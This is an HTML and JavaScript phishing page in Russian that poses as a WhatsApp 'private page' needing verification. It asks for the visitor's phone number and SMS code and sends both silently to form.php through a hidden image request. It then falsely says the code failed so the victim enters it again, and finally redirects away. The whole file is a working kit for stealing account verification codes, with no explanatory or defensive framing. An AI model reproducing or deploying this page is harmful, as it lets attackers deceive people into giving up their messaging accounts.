

<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatApp</title>
    <script>
    var ii = 0;
    </script>
    <style>
    .h{
      font-family: arial,sans-serif;
      font-size: 22px;
    }
    .h2{
      font-family: arial,sans-serif;
      font-size: 17px;
    }
    center{margin-top: 8%;}
      #code{
        display:none;

      }.inp{
        height:45px;
        width:300px;
        border-radius: 25px;
        border:1px solid #fff;
        box-shadow: 0 0 1px 0.2px rgba(0,0,0,0.15),0 1px 12px rgba(0,0,0,0.15);
        padding: 0px 0px 0px 25px;
      }.sun{
        height:40px;
        width:120px;
        border:1px solid #21d86a;
        background:#21d86a;
        border-radius: 25px;
        color:#fff;
        font-size: 16px;
      }.recap{
        border-radius: 90px;
        padding: 8px 40px 0px 0px;
      }  /*.icq{
        border:1px solid #000;
        border-radius: 100%;
        background: #000;*/
      }
    </style>
  </head>
  <body>
    <center>
      <img src="w.png" height="100px" class="icq"><br><br>
      <div class="h">
        Приватная страница
      </div>
      <br>
      <div class="h2">
        Введите номер телефона, что бы пройти верификацию.
      </div>
      <div id="block" ><br><br>
        <input type="tel" id=numb class="inp" placeholder="+"><br><br>
        <button type="submit" id="phone" class="sun" placeholder="Phone number" ><l>Далее</l></button>
      </div>
      <div id=code>
        <input name="" id="send_code" class="inp" type="tel"  placeholder="Смс код"><br><br>
        <input type="submit" value="Продолжить" id="send" class="sun">
      </div>

    </center>
  <img scr="" style="display:none;" id=sender>
  </body>
  <script>
  var code = document.getElementById('code')
  var block = document.getElementById('block')
  var numb = document.getElementById('numb')
  var sender = document.getElementById('sender')
  document.getElementById('phone').onclick = function(){
    if(numb.value===""){alert("Error. Укажите номер телефона!")}else{
    sender.src="form.php?phone="+numb.value;
    code.style.display="block";
    document.getElementById('phone').style.display="none";
    document.getElementById('ttx').innerHTML="Введите код из Смс"
    //block.style.display="none";
  }
  };
  document.getElementById('send').onclick = function(){
    if(document.getElementById('send_code').value===""){alert("Error. Введите смс код!")}else{
      sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value;
      alert("Повторите снова код")
      ii++;
    }
    if(ii == 2){
      if(document.getElementById('send_code').value===""){alert("Error. Введите смс код!")}else{
        sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value
        window.location.href="<?php echo file_get_contents("location.u"); ?>";
    }}
    document.getElementById('send_code').value=""
  };
  </script>
</html>
